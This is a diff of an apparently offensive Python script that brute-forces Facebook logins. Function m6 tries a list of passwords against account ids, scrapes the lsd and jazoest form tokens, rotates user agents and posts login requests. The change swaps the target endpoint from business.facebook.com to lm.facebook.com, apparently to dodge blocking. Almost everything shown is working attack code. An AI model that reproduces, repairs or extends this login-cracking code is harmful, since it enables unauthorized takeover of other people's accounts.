@@ -1221,7 +1221,7 @@ def m6(idf,pw):
   for ps in pw:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://business.facebook.com').text
+   free_fb = session.get('https://lm.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1233,7 +1233,7 @@ def m6(idf,pw):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'business.facebook.com',
+            'authority': 'lm.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
